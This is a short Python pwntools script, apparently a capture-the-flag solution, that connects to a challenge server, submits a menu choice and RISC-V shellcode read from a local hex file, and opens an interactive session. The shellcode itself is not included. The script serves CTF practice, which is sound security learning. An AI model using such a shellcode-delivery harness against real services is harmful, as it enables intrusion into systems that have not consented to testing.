#!/usr/bin/env python3
from pwn import *
io = remote('nooopsled.challenges.ooo', 5000)
fp = open('riscv64.hex')
io.recvuntil(b'What is your choice? ')
io.send(fp.readline())
io.recvuntil(b'Input your shellcode (in hex): ')
io.send(fp.readline())
io.interactive()
